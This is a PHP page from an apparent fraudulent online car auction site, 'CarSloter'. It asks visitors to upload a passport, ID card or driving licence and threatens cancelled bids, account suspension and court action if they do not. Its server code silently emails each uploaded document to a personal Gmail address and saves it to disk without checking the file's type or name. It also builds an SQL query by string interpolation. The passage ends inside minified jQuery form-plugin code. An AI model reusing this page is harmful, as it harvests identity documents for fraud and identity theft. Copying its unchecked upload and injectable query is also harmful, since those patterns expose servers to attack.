<?php include('common/config.php');

$session_id=$_SESSION['USER'];
function protect_user()
{
if(empty($_SESSION['USER']))
{
echo "<script>window.location.href='login.php'</script>";
}
}
if(isset($_GET['pid']))
{
$pid=$_GET['pid'];
}

echo protect_user();

if(isset($_POST['update']))
{
$doc_img1=$_FILES['u_document']['name'];
$img1_location=$_FILES['u_document']['tmp_name'];
$admPath=ADMIN_PATH;
$rand=rand();
if($doc_img1!="")
{
$ndoc_img1=$rand.'-'.$doc_img1;
} else 
{
$ndoc_img1="";
}
//echo "update tbl_users set u_document='$ndoc_img1' where u_id='$session_id'";
///exit;
$stmt=$conn->prepare("update tbl_users set u_document=:ndoc_img1 where u_id=:session_id");	
$stmt->bindParam(':ndoc_img1',$ndoc_img1, PDO::PARAM_STR);
$stmt->bindParam(':session_id',$session_id,PDO::PARAM_STR);
$result=$stmt->execute();
if($result)
{
$sqlu=$conn->prepare("select * from tbl_users where u_id=$session_id");
$sqlu->execute();
$resultsu=$sqlu->fetch(PDO::FETCH_OBJ);
$u_fname=$resultsu->u_fname;
$u_lname=$resultsu->u_lname;      

$from_email         = 'no-reply@carsloter.eu'; //from mail, it is mandatory with some hosts
$recipient_email    = 'carolgreen281@gmail.com'; //recipient email (most cases it is your personal email)

//Capture POST data from HTML form and Sanitize them, 
$sender_name    = ""; //sender name
$reply_to_email = "no-reply@carsloter.eu"; //sender email used in "reply-to" header
$subject        = 'ID: ' . $u_fname .' ' . $u_lname; //get subject from HTML
$message        = ''; //message

/* //don't forget to validate empty fields 
if(strlen($sender_name)<1){
die('Name is too short or empty!');
} 
*/

//Get uploaded file data
$file_tmp_name    = $_FILES['u_document']['tmp_name'];
$file_name        = $_FILES['u_document']['name'];
$file_size        = $_FILES['u_document']['size'];
$file_type        = $_FILES['u_document']['type'];
$file_error       = $_FILES['u_document']['error'];

if($file_error > 0)
{
die('Upload error or No files uploaded');
}
//read from the uploaded file & base64_encode content for the mail
$handle = fopen($file_tmp_name, "r");
$content = fread($handle, $file_size);
fclose($handle);
$encoded_content = chunk_split(base64_encode($content));

$boundary = md5("sanwebe");
//header
$headers = "MIME-Version: 1.0\r\n"; 
$headers .= 'From: Upload ID < ID@carsloter.eu >' . "\r\n"; 
$headers .= "Reply-To: ".$reply_to_email."" . "\r\n";
$headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n"; 

//plain text 
$body = "--$boundary\r\n";
$body .= "Content-Type: text/plain; charset=ISO-8859-1\r\n";
$body .= "Content-Transfer-Encoding: base64\r\n\r\n"; 
$body .= chunk_split(base64_encode($message)); 

//attachment
$body .= "--$boundary\r\n";
$body .="Content-Type: $file_type; name=".$file_name."\r\n";
$body .="Content-Disposition: attachment; filename=".$file_name."\r\n";
$body .="Content-Transfer-Encoding: base64\r\n";
$body .="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n"; 
$body .= $encoded_content; 

$sentMail = @mail($recipient_email, $subject, $body, $headers,'-fID@nswmotorauction.com');	
move_uploaded_file($img1_location,$admPath."/uploaded_file/document/".$ndoc_img1); 
/// echo "<script>window.alert('Id uploaded successfully')</script>";
////echo "<script>window.location.href='forder.php?pid=$pid'</script>";
////echo "<script>window.location.href='idupload.php'</script>";
$_SESSION['SUCC_UPLPID']='Id uploaded successfully';
$backURL=$_SERVER['HTTP_REFERER'];
echo "<script>window.location.href=window.history.back()</script>";

///echo "<script> window.history.go(-2)</script>";
} else 
{
echo "<script>window.alert('error')</script>";
}
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<!--[if IE]>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<![endif]-->
<meta name="description" content="">
<meta name="author" content="ScriptsBundle">
<title>CarSloter Upload ID | company details</title>
<!-- =-=-=-=-=-=-= Favicons Icon =-=-=-=-=-=-= -->
<link rel="icon" href="images/favicon.ico" type="image/x-icon" />
<!-- =-=-=-=-=-=-= Mobile Specific =-=-=-=-=-=-= -->
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<!-- =-=-=-=-=-=-= Bootstrap CSS Style =-=-=-=-=-=-= -->
<link rel="stylesheet" href="css/bootstrap.css">
<!-- =-=-=-=-=-=-= Template CSS Style =-=-=-=-=-=-= -->
<link rel="stylesheet" href="css/style.css">
<!-- =-=-=-=-=-=-= Font Awesome =-=-=-=-=-=-= -->
<link rel="stylesheet" href="css/font-awesome.css" type="text/css">
<!-- =-=-=-=-=-=-= Flat Icon =-=-=-=-=-=-= -->
<link href="css/flaticon.css" rel="stylesheet">
<!-- =-=-=-=-=-=-= Et Line Fonts =-=-=-=-=-=-= -->
<link rel="stylesheet" href="css/et-line-fonts.css" type="text/css">
<!-- =-=-=-=-=-=-= Menu Drop Down =-=-=-=-=-=-= -->
<link rel="stylesheet" href="css/home-menu.css" type="text/css">
<!-- =-=-=-=-=-=-= Animation =-=-=-=-=-=-= -->
<link rel="stylesheet" href="css/animate.min.css" type="text/css">
<!-- =-=-=-=-=-=-= Select Options =-=-=-=-=-=-= -->
<link href="css/select2.min.css" rel="stylesheet" />
<!-- =-=-=-=-=-=-= noUiSlider =-=-=-=-=-=-= -->
<link href="css/nouislider.min.css" rel="stylesheet">
<!-- =-=-=-=-=-=-= Listing Slider =-=-=-=-=-=-= -->
<link href="css/slider.css" rel="stylesheet">
<!-- =-=-=-=-=-=-= Owl carousel =-=-=-=-=-=-= -->
<link rel="stylesheet" type="text/css" href="css/owl.carousel.css">
<link rel="stylesheet" type="text/css" href="css/owl.theme.css">
<!-- =-=-=-=-=-=-= Check boxes =-=-=-=-=-=-= -->
<link href="skins/minimal/minimal.css" rel="stylesheet">
<!-- =-=-=-=-=-=-= PrettyPhoto =-=-=-=-=-=-= -->
<link rel="stylesheet" href="css/jquery.fancybox.min.css" type="text/css" media="screen"/>
<!-- =-=-=-=-=-=-= Responsive Media =-=-=-=-=-=-= -->
<link href="css/responsive-media.css" rel="stylesheet">
<!-- =-=-=-=-=-=-= Template Color =-=-=-=-=-=-= -->
<link rel="stylesheet" id="color" href="css/colors/defualt.css">
<link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CSource+Sans+Pro:400,400i,600" rel="stylesheet">
<!-- JavaScripts -->

<!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css" integrity="sha384-lKuwvrZot6UHsBSfcMvOkWwlCMgc0TaWr+30HWe3a4ltaBwTZhyTEggF5tJv8tbt" crossorigin="anonymous"> -->
<link href="fileuploads/css/dropify.css" rel="stylesheet" type="text/css" />

<script src="js/modernizr.js"></script>
<style>
.right-arrow
{
margin-right: 20px;
}	

.d-flex {
    display: -ms-flexbox!important;
    display: flex!important;
}

.step {
list-style: none;
margin: .2rem 0;
width: 100%;
}

.step .step-item {
-ms-flex: 1 1 0;
flex: 1 1 0;
margin-top: 0;
min-height: 1rem;
position: relative;
text-align: center;
}

}
.step {
justify-content: center;
padding: 0px;
}
.btn-continue{
float:none !important;
display:inline-block;
margin-right:0px !important;
}
.step .step-item:not(:first-child)::before {
background: #11998e;  /* fallback for old browsers */
background: -webkit-linear-gradient(to right, #38ef7d, #11998e);  /* Chrome 10-25, Safari 5.1-6 */
background: linear-gradient(to right, #38ef7d, #11998e); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */

content: "";
height: 2px;
left: -50%;
position: absolute;
top: 9px;
width: 100%;
}

.step .step-item a {
color: #5EC26E;
display: inline-block;
padding: 20px 10px 0;
text-decoration: none;
font-family: 'Titillium Web', sans-serif;
}

.step .step-item a::before {
background: #5EC26E;
border: .1rem solid #fff;
border-radius: 50%;
content: "";
display: block;
height: 14.3906px;
left: 50%;
position: absolute;
top: .2rem;
transform: translateX(-50%);
width: 14.3906px;
z-index: 1;
}

.step .step-item.active a::before {
background: #fff;
border: .1rem solid #5EC26E;
}

.step .step-item.active ~ .step-item::before {
background: #e7e9ed;
}

.step .step-item.active ~ .step-item a::before {
background: #e7e9ed;
}


.btn-back {
float: left; margin-top: 20px; margin-left: 10px; border: 2px solid #5EC26E; padding: 10px 50px; border-radius: 15px; color: #5EC26E; font-family: 'Muli', sans-serif;
}

.btn-continue {
float: right; margin-top: 20px; margin-bottom: 20px; margin-right: 10px; border: 1px solid; padding: 10px 50px; border-radius: 15px; color: #fff; font-family: 'Muli', sans-serif; background: #11998e;  /* fallback for old browsers */
background: -webkit-linear-gradient(to right, #38ef7d, #11998e);  /* Chrome 10-25, Safari 5.1-6 */
background: linear-gradient(to right, #38ef7d, #11998e);
}

.panel {
background-color: white;    box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .2); height: 90%; margin: 0 10px; padding: 35px
}

#uploadForm {border-top:#F0F0F0 2px solid;background:#FAF8F8;padding:10px;}
#uploadForm label {margin:2px; font-size:1em; font-weight:bold;}
.demoInputBox{padding:5px; border:#F0F0F0 1px solid; border-radius:4px; background-color:#FFF;}
#progress-bar {background-color: #12CC1A;height:20px;color: #FFFFFF;width:0%;-webkit-transition: width .3s;-moz-transition: width .3s;transition: width .3s;}
.btnSubmit{background-color:#09f;border:0;padding:10px 40px;color:#FFF;border:#F0F0F0 1px solid; border-radius:4px;}
#progress-div {border:#0FA015 1px solid;padding: 5px 0px;margin:30px 0px;border-radius:4px;text-align:center;}
#targetLayer{width:100%;text-align:center;}

</style>

</head>
<body>
<!-- =-=-=-=-=-=-=  Header =-=-=-=-=-=-= -->
<?php include('common/header.php'); ?>

<div class="clearfix"></div>
<!-- =-=-=-=-=-=-= Primary Header End =-=-=-=-=-=-= -->
<!-- =-=-=-=-=-=-= Main Content Area =-=-=-=-=-=-= -->
<div class="main-content-area clearfix ">
<!-- =-=-=-=-=-=-= Latest Ads =-=-=-=-=-=-= -->
<section class="section-padding no-top gray padding-top-20">
<!-- Main Container -->
<div class="container">
<!-- Row -->
<div class="back-links">
<div class="justify-content-between  row">
<div class="col-md-6"> <span class="fa fa-chevron-left"></span> <a class="link uitest-navigation-back" onclick="window.history.back()">Back to results</a></div>
<div class="align-right col-md-6"></div>
</div>
</div>

<div class="row" style="margin: 50px 0px;">
<div class="col-md-1"></div>
<div class="col-md-10">

<?php
if(isset($_SESSION['SUCC_UPLPID']) && $_SESSION['SUCC_UPLPID']!='')
{	
?>	
<div class="alert alert-success">
<strong><i class="fa fa-check-circle"></i> Id uploaded successfully.</strong> 
</div>
<?php } 
unset($_SESSION['SUCC_UPLPID']);
?>

<div class="panel">
<h3 style="font-family: 'Muli', sans-serif; float: left;"> Upload ID</h3>
<img src="http://www.pngmart.com/files/3/Auction-PNG-Transparent-Image.png" style="float: right; width: 50px;" alt="">
<div style="clear: both;"></div>
<ul class="step d-flex flex-nowrap" style="margin: 20px 0px;">
<li class="step-item active">
<a href="#" class=""><i class="fa fa-address-card"></i> Upload ID</a>
</li>
<li class="step-item">
<a href="#" class=""><i class="fa fa-check-square"></i> Confirmation</a>
</li>
<li class="step-item ">
<a href="#" class=""><i class="fa fa-medal"></i> Finish</a>
</li>
</ul>
<br />
<p style="font-family: 'Titillium Web', sans-serif;">
To complete the registration and order please submit a photo with ID (Passport, ID Card, Driving Licence) in high quality. <br />
The copy of the ID is the required to sign an agreement with you and for invoicing when you buying an item.<br />
This servs also as your acceptance of the terms and full commitment of purchase.<br />
<br>Make sure the document is clearly visible and is 100% readable otherwise your bids will be cancelled and your account suspended.<br /><br><br>
<i class="fa fa-exclamation-circle" style="color: #ff0a25;"></i> In case of payment rejection our lawyers will use this agreement in court to pursue foreclosure proceedings.<br />

</p>
<div class="row" style="margin-top: 55px;">
<br><br>
<div class="col-md-6">
<form id="uploadForm" action="upload.php" method="POST">
<div class="form-group">
<div style="height: 199px; display: none;background: white; text-align: center;" id="loading">
	<image src="img/loading.gif" style="height: 100%;" />
</div>
<div class="dropify-wrapper" style="height: 199px; display: block;">
	<div class="dropify-message">
		<span class="file-icon"></span> <p><b>Add front of ID<b> <br>JPEG or PNG</b></b></p>
	</div>
</div>
<div class="dropify-preview" style="display: none;">
	<span class="dropify-render">
		<img src="" style="max-height: 185px;" id="prevImage">
	</span>
</div>
<input id="file" type="file" name="u_document" required="" style="opacity: 0;margin: auto; margin-top: -22px;width: 1px;" />
</div>


</div>
<div class="col-md-6">
<img src="idcard.jpg" style="width:100%;" alt="">
</div>
<div class="col-md-12">
<div class="col-md-6" style="padding: 0;">
<p style="font-size:13px;">You can send documents by e-mail for manual verification: <a href="mailto:support@carsloter.eu">support@carsloter.eu</a> <br />
(.jpg, .jpeg, .png) image type accepted 16mb max size.  </p>
</div>
</div>
</div>


</div>

<input type="submit" style="display: none;" id="submitBtn">

</form>
<div style="background-color: rgb(239, 239, 239); box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .2); height: 15%; margin: 0 10px; text-align:center;">

<div style="width: 200px;margin: auto;padding: 15px 0;">
<button class="cotw-btn secondary positive uitest-search-btn" id="continueBtn"><span>Continue</span></button>
</div>
</div>
<div style="clear: both;"></div>
</div>
</div>
<div class="col-md-1"></div>
</div>

<!-- Row End -->
</div>
<!-- Main Container End -->


</section>


<!-- =-=-=-=-=-=-= Ads Archives End =-=-=-=-=-=-= -->
<!-- =-=-=-=-=-=-= FOOTER =-=-=-=-=-=-= -->
<?php include('common/footer.php'); ?>

<!-- =-=-=-=-=-=-= FOOTER END =-=-=-=-=-=-= -->
</div>
<!-- Back To Top -->
<a href="#0" class="cd-top">Top</a>
<!-- =-=-=-=-=-=-= JQUERY =-=-=-=-=-=-= -->
<script src="js/jquery.min.js"></script>
<!-- Bootstrap Core Css  -->
<script src="js/bootstrap.min.js"></script>
<!-- Jquery Easing -->
<script src="js/easing.js"></script>
<!-- Menu Hover  -->
<script src="js/carspot-menu.js"></script>
<!-- Jquery Appear Plugin -->
<script src="js/jquery.appear.min.js"></script>
<!-- Numbers Animation   -->
<script src="js/jquery.countTo.js"></script>
<!-- Jquery Select Options  -->
<script src="js/select2.min.js"></script>
<!-- noUiSlider -->
<script src="js/nouislider.all.min.js"></script>
<!-- Carousel Slider  -->
<script src="js/carousel.min.js"></script>
<script src="js/slide.js"></script>
<!-- Image Loaded  -->
<script src="js/imagesloaded.js"></script>
<script src="js/isotope.min.js"></script>
<!-- CheckBoxes  -->
<script src="js/icheck.min.js"></script>
<!-- Jquery Migration  -->
<script src="js/jquery-migrate.min.js"></script>
<!-- Style Switcher -->
<script src="js/color-switcher.js"></script>
<!-- PrettyPhoto -->
<script src="js/jquery.fancybox.min.js"></script>
<!-- Wow Animation -->
<script src="js/wow.js"></script>
<!-- Template Core JS -->
<script src="js/custom.js"></script>

<script src="fileuploads/js/dropify.js"></script>
<script >
// $('.dropify').dropify({
// messages: {
// 'default': '<b>Add front of ID<b> <br>JPEG or PNG',
// 'replace': 'aDrag and drop or click to replace',
// 'remove': 'Remove',
// 'error': 'Ooops, something wrong appended.'
// },
// error: {
// 'fileSize': 'The file size is too big (16M max).'
// }
// });
</script>
<script>
/* jquery.form.min.js */
(function(e){"use strict";if(typeof define==="function"&&define.amd){define(["jquery"],e)}else{e(typeof jQuery!="undefined"?jQuery:window.Zepto)}})(function(e){"use strict";function r(t){var n=t.data;if(!t.isDefaultPrevented()){t.preventDefault();e(t.target).ajaxSubmit(n)}}function i(t){var n=t.target;var r=e(n);if(!r.is("[type=submit],[type=image]")){var i=r.closest("[type=submit]");if(i.length===0){return}n=i[0]}var s=this;s.clk=n;if(n.type=="image"){if(t.offsetX!==undefined){s.clk_x=t.offsetX;s.clk_y=t.offsetY}else if(typeof e.fn.offset=="function"){var o=r.offset();s.clk_x=t.pageX-o.left;s.clk_y=t.pageY-o.top}else{s.clk_x=t.pageX-n.offsetLeft;s.clk_y=t.pageY-n.offsetTop}}setTimeout(function(){s.clk=s.clk_x=s.clk_y=null},100)}function s(){if(!e.fn.ajaxSubmit.debug){return}var t="[jquery.form] "+Array.prototype.join.call(arguments,"");if(window.console&&window.console.log){window.console.log(t)}else if(window.opera&&window.opera.postError){window.opera.postError(t)}}var t={};t.fileapi=e("<input type='file'/>").get(0).files!==undefined;t.formdata=window.FormData!==undefined;var n=!!e.fn.prop;e.fn.attr2=function(){if(!n){return this.attr.apply(this,arguments)}var e=this.prop.apply(this,arguments);if(e&&e.jquery||typeof e==="string"){return e}return this.attr.apply(this,arguments)};e.fn.ajaxSubmit=function(r){function k(t){var n=e.param(t,r.traditional).split("&");var i=n.length;var s=[];var o,u;for(o=0;o<i;o++){n[o]=n[o].replace(/\+/g," ");u=n[o].split("=");s.push([decodeURIComponent(u[0]),decodeURIComponent(u[1])])}return s}function L(t){var n=new FormData;for(var s=0;s<t.length;s++){n.append(t[s].name,t[s].value)}if(r.extraData){var o=k(r.extraData);for(s=0;s<o.length;s++){if(o[s]){n.append(o[s][0],o[s][1])}}}r.data=null;var u=e.extend(true,{},e.ajaxSettings,r,{contentType:false,processData:false,cache:false,type:i||"POST"});if(r.uploadProgress){u.xhr=function(){var t=e.ajaxSettings.xhr();if(t.upload){t.upload.addEventListener("progress",function(e){var t=0;var n=e.loaded||e.position;var i=e.total;if(e.lengthComputable){t=Math.ceil(n/i*100)}r.uploadProgress(e,n,i,t)},false)}return t}}u.data=null;var a=u.beforeSend;u.beforeSend=function(e,t){if(r.formData){t.data=r.formData}else{t.data=n}if(a){a.call(this,e,t)}};return e.ajax(u)}function A(t){function T(e){var t=null;try{if(e.contentWindow){t=e.contentWindow.document}}catch(n){s("cannot get iframe.contentWindow document: "+n)}if(t){return t}try{t=e.contentDocument?e.contentDocument:e.document}catch(n){s("cannot get iframe.contentDocument: "+n);t=e.document}return t}function k(){function f(){try{var e=T(v).readyState;s("state = "+e);if(e&&e.toLowerCase()=="uninitialized"){setTimeout(f,50)}}catch(t){s("Server abort: ",t," (",t.name,")");_(x);if(w){clearTimeout(w)}w=undefined}}var t=a.attr2("target"),n=a.attr2("action"),r="multipart/form-data",u=a.attr("enctype")||a.attr("encoding")||r;o.setAttribute("target",p);if(!i||/post/i.test(i)){o.setAttribute("method","POST")}if(n!=l.url){o.setAttribute("action",l.url)}if(!l.skipEncodingOverride&&(!i||/post/i.test(i))){a.attr({encoding:"multipart/form-data",enctype:"multipart/form-data"})}if(l.timeout){w=setTimeout(function(){b=true;_(S)},l.timeout)}var c=[];try{if(l.extraData){for(var h in l.extraData){if(l.extraData.hasOwnProperty(h)){if(e.isPlainObject(l.extraData[h])&&l.extraData[h].hasOwnProperty("name")&&l.extraData[h].hasOwnProperty("value")){c.push(e('<input type="hidden" name="'+l.extraData[h].name+'">').val(l.extraData[h].value).appendTo(o)[0])}else{c.push(e('<input type="hidden" name="'+h+'">').val(l.extraData[h]).appendTo(o)[0])}}}}if(!l.iframeTarget){d.appendTo("body")}if(v.attachEvent){v.attachEvent("onload",_)}else{v.addEventListener("load",_,false)}setTimeout(f,15);try{o.submit()}catch(m){var g=document.createElement("form").submit;g.apply(o)}}finally{o.setAttribute("action",n);o.setAttribute("enctype",u);if(t){o.setAttribute("target",t)}else{a.removeAttr("target")}e(c).remove()}}function _(t){if(m.aborted||M){return}A=T(v);if(!A){s("cannot access response document");t=x}if(t===S&&m){m.abort("timeout");E.reject(m,"timeout");return}else if(t==x&&m){m.abort("server abort");E.reject(m,"error","server abort");return}if(!A||A.location.href==l.iframeSrc){if(!b){return}}if(v.detachEvent){v.detachEvent("onload",_)}else{v.removeEventListener("load",_,false)}var n="success",r;try{if(b){throw"timeout"}var i=l.dataType=="xml"||A.XMLDocument||e.isXMLDoc(A);s("isXml="+i);if(!i&&window.opera&&(A.body===null||!A.body.innerHTML)){if(--O){s("requeing onLoad callback, DOM not available");setTimeout(_,250);return}}var o=A.body?A.body:A.documentElement;m.responseText=o?o.innerHTML:null;m.responseXML=A.XMLDocument?A.XMLDocument:A;if(i){l.dataType="xml"}m.getResponseHeader=function(e){var t={"content-type":l.dataType};return t[e.toLowerCase()]};if(o){m.status=Number(o.getAttribute("status"))||m.status;m.statusText=o.getAttribute("statusText")||m.statusText}var u=(l.dataType||"").toLowerCase();var a=/(json|script|text)/.test(u);if(a||l.textarea){var f=A.getElementsByTagName("textarea")[0];if(f){m.responseText=f.value;m.status=Number(f.getAttribute("status"))||m.status;m.statusText=f.getAttribute("statusText")||m.statusText}else if(a){var c=A.getElementsByTagName("pre")[0];var p=A.getElementsByTagName("body")[0];if(c){m.responseText=c.textContent?c.textContent:c.innerText}else if(p){m.responseText=p.textContent?p.textContent:p.innerText}}}else if(u=="xml"&&!m.responseXML&&m.responseText){m.responseXML=D(m.responseText)}try{L=H(m,u,l)}catch(g){n="parsererror";m.error=r=g||n}}catch(g){s("error caught: ",g);n="error";m.error=r=g||n}if(m.aborted){s("upload aborted");n=null}if(m.status){n=m.status>=200&&m.status<300||m.status===304?"success":"error"}if(n==="success"){if(l.success){l.success.call(l.context,L,"success",m)}E.resolve(m.responseText,"success",m);if(h){e.event.trigger("ajaxSuccess",[m,l])}}else if(n){if(r===undefined){r=m.statusText}if(l.error){l.error.call(l.context,m,n,r)}E.reject(m,"error",r);if(h){e.event.trigger("ajaxError",[m,l,r])}}if(h){e.event.trigger("ajaxComplete",[m,l])}if(h&&!--e.active){e.event.trigger("ajaxStop")}if(l.complete){l.complete.call(l.context,m,n)}M=true;if(l.timeout){clearTimeout(w)}setTimeout(function(){if(!l.iframeTarget){d.remove()}else{d.attr("src",l.iframeSrc)}m.responseXML=null},100)}var o=a[0],u,f,l,h,p,d,v,m,g,y,b,w;var E=e.Deferred();E.abort=function(e){m.abort(e)};if(t){for(f=0;f<c.length;f++){u=e(c[f]);if(n){u.prop("disabled",false)}else{u.removeAttr("disabled")}}}l=e.extend(true,{},e.ajaxSettings,r);l.context=l.context||l;p="jqFormIO"+(new Date).getTime();if(l.iframeTarget){d=e(l.iframeTarget);y=d.attr2("name");if(!y){d.attr2("name",p)}else{p=y}}else{d=e('<iframe name="'+p+'" src="'+l.iframeSrc+'" />');d.css({position:"absolute",top:"-1000px",left:"-1000px"})}v=d[0];m={aborted:0,responseText:null,responseXML:null,status:0,statusText:"n/a",getAllResponseHeaders:function(){},getResponseHeader:function(){},setRequestHeader:function(){},abort:function(t){var n=t==="timeout"?"timeout":"aborted";s("aborting upload... "+n);this.aborted=1;try{if(v.contentWindow.document.execCommand){v.contentWindow.document.execCommand("Stop")}}catch(r){}d.attr("src",l.iframeSrc);m.error=n;if(l.error){l.error.call(l.context,m,n,t)}if(h){e.event.trigger("ajaxError",[m,l,n])}if(l.complete){l.complete.call(l.context,m,n)}}};h=l.global;if(h&&0===e.active++){e.event.trigger("ajaxStart")}if(h){e.event.trigger("ajaxSend",[m,l])}if(l.beforeSend&&l.beforeSend.call(l.context,m,l)===false){if(l.global){e.active--}E.reject();return E}if(m.aborted){E.reject();return E}g=o.clk;if(g){y=g.name;if(y&&!g.disabled){l.extraData=l.extraData||{};l.extraData[y]=g.value;if(g.type=="image"){l.extraData[y+".x"]=o.clk_x;l.extraData[y+".y"]=o.clk_y}}}var S=1;var x=2;var N=e("meta[name=csrf-token]").attr("content");var C=e("meta[name=csrf-param]").attr("content");if(C&&N){l.extraData=l.extraData||{};l.extraData[C]=N}if(l.forceSync){k()}else{setTimeout(k,10)}var L,A,O=50,M;var D=e.parseXML||function(e,t){if(window.ActiveXObject){t=new ActiveXObject("Microsoft.XMLDOM");t.async="false";t.loadXML(e)}else{t=(new DOMParser).parseFromString(e,"text/xml")}return t&&t.documentElement&&t.documentElement.nodeName!="parsererror"?t:null};var P=e.parseJSON||function(e){return window["eval"]("("+e+")")};var H=function(t,n,r){var i=t.getResponseHeader("content-type")||"",s=n==="xml"||!n&&i.indexOf("xml")>=0,o=s?t.responseXML:t.responseText;if(s&&o.documentElement.nodeName==="parsererror"){if(e.error){e.error("parsererror")}}if(r&&r.dataFilter){o=r.dataFilter(o,n)}if(typeof o==="string"){if(n==="json"||!n&&i.indexOf("json")>=0){o=P(o)}else if(n==="script"||!n&&i.indexOf("javascript")>=0){e.globalEval(o)}}return o};return E}if(!this.length){s("ajaxSubmit: skipping submit process - no element selected");return this}var i,o,u,a=this;if(typeof r=="function"){r={success:r}}else if(r===undefined){r={}}i=r.type||this.attr2("method");o=r.url||this.attr2("action");u=typeof o==="string"?e.trim(o):"";u=u||window.location.href||"";if(u){u=(u.match(/^([^#]+)/)||[])[1]}r=e.extend(true,{url:u,success:e.ajaxSettings.success,type:i||e.ajaxSettings.type,iframeSrc:/^https/i.test(window.location.href||"")?"javascript:false":"about:blank"},r);var f={};this.trigger("form-pre-serialize",[this,r,f]);if(f.veto){s("ajaxSubmit: submit vetoed via form-pre-serialize trigger");return this}if(r.beforeSerialize&&r.beforeSerialize(this,r)===false){s("ajaxSubmit: submit aborted via beforeSerialize callback");return this}var l=r.traditional;if(l===undefined){l=e.ajaxSettings.traditional}var c=[];var h,p=this.formToArray(r.semantic,c);if(r.data){r.extraData=r.data;h=e.param(r.data,l)}if(r.beforeSubmit&&r.beforeSubmit(p,this,r)===false){s("ajaxSubmit: submit aborted via beforeSubmit callback");return this}this.trigger("form-submit-validate",[p,this,r,f]);if(f.veto){s("ajaxSubmit: submit vetoed via form-submit-validate trigger");return this}var d=e.param(p,l);if(h){d=d?d+"&"+h:h}if(r.type.toUpperCase()=="GET"){r.url+=(r.url.indexOf("?")>=0?"&":"?")+d;r.data=null}else{r.data=d}var v=[];if(r.resetForm){v.push(function(){a.resetForm()})}if(r.clearForm){v.push(function(){a.clearForm(r.includeHidden)})}if(!r.dataType&&r.target){var m=r.success||function(){};v.push(function(t){var n=r.replaceTarget?"replaceWith":"html";e(r.target)[n](t).each(m,arguments)})}else if(r.success){v.push(r.success)}r.success=function(e,t,n){var i=r.context||this;for(var s=0,o=v.length;s<o;s++){v[s].apply(i,[e,t,n||a,a])}};if(r.error){var g=r.error;r.error=function(e,t,n){var i=r.context||this;g.apply(i,[e,t,n,a])}}if(r.complete){var y=r.complete;r.complete=function(e,t){var n=r.context||this;y.apply(n,[e,t,a])}}var b=e("input[type=file]:enabled",this).filter(function(){return e(this).val()!==""});var w=b.length>0;var E="multipart/form-data";var S=a.attr("enctype")==E||a.attr("encoding")==E;var x=t.fileapi&&t.formdata;s("fileAPI :"+x);var T=(w||S)&&!x;var N;if(r.iframe!==false&&(r.iframe||T)){if(r.closeKeepAlive){e.get(r.closeKeepAlive,function(){N=A(p)})}else{N=A(p)}}else if((w||S)&&x){N=L(p)}else{N=e.ajax(r)}a.removeData("jqxhr").data("jqxhr",N);for(var C=0;C<c.length;C++){c[C]=null}this.trigger("form-submit-notify",[this,r]);return this};e.fn.ajaxForm=function(t){t=t||{};t.delegation=t.delegation&&e.isFunction(e.fn.on);if(!t.delegation&&this.length===0){var n={s:this.selector,c:this.context};if(!e.isReady&&n.s){s("DOM not ready, queuing ajaxForm");e(function(){e(n.s,n.c).ajaxForm(t)});return this}s("terminating; zero elements found by selector"+(e.isReady?"":" (DOM not ready)"));return this}if(t.delegation){e(document).off("submit.form-plugin",this.selector,r).off("click.form-plugin",this.selector,i).on("submit.form-plugin",this.selector,t,r).on("click.form-plugin",this.selector,t,i);return this}return this.ajaxFormUnbind().bind("submit.form-plugin",t,r).bind("click.form-plugin",t,i)};e.fn.ajaxFormUnbind=function(){return this.unbind("submit.form-plugin click.form-plugin")};e.fn.formToArray=function(n,r){var i=[];if(this.length===0){return i}var s=this[0];var o=this.attr("id");var u=n?s.getElementsByTagName("*"):s.elements;var a;if(u&&!/MSIE [678]/.test(navigator.userAgent)){u=e(u).get()}if(o){a=e(':input[form="'+o+'"]').get();if(a.length){u=(u||[]).concat(a)}}if(!u||!u.length){return i}var f,l,c,h,p,d,v;for(f=0,d=u.length;f<d;f++){p=u[f];c=p.name;if(!c||p.disabled){continue}if(n&&s.clk&&p.type=="image"){if(s.clk==p){i.push({name:c,value:e(p).val(),type:p.type});i.push({name:c+".x",value:s.clk_x},{name:c+".y",value:s.clk_y})}continue}h=e.fieldValue(p,true);if(h&&h.constructor==Array){if(r){r.push(p)}for(l=0,v=h.length;l<v;l++){i.push({name:c,value:h[l]})}}else if(t.fileapi&&p.type=="file"){if(r){r.push(p)}var m=p.files;if(m.length){for(l=0;l<m.length;l++){i.push({name:c,value:m[l],type:p.type})}}else{i.push({name:c,value:"",type:p.type})}}else if(h!==null&&typeof h!="undefined"){if(r){r.push(p)}i.push({name:c,value:h,type:p.type,required:p.required})}}if(!n&&s.clk){var g=e(s.clk),y=g[0];c=y.name;if(c&&!y.disabled&&y.type=="image"){i.push({name:c,value:g.val()});i.push({name:c+".x",value:s.clk_x},{name:c+".y",value:s.clk_y})}}return i};e.fn.formSerialize=function(t){return e.param(this.formToArray(t))};e.fn.fieldSerialize=function(t){var n=[];this.each(function(){var r=this.name;if(!r){return}var i=e.fieldValue(this,t);if(i&&i.constructor==Array){for(var s=0,o=i.length;s<o;s++){n.push({name:r,value:i[s]})}}else if(i!==null&&typeof i!="undefined"){n.push({name:this.name,value:i})}});return e.param(n)};e.fn.fieldValue=function(t){for(var n=[],r=0,i=this.length;r<i;r++){var s=this[r];var o=e.fieldValue(s,t);if(o===null||typeof o=="undefined"||o.constructor==Array&&!o.length){continue}if(o.constructor==Array){e.merge(n,o)}else{n.push(o)}}return n};e.fieldValue=function(t,n){var r=t.name,i=t.type,s=t.tagName.toLowerCase();if(n===undefined){n=true}if(n&&(!r||t.disabled||i=="reset"||i=="button"||(i=="checkbox"||i=="radio")&&!t.checked||(i=="submit"||i=="image")&&t.form&&t.form.clk!=t||s=="select"&&t.selectedIndex==-1)){return null}if(s=="select"){var o=t.selectedIndex;if(o<0){return null}var u=[],a=t.options;var f=i=="select-one";var l=f?o+1:a.length;for(var c=f?o:0;c<l;c++){var h=a[c];if(h.selected){var 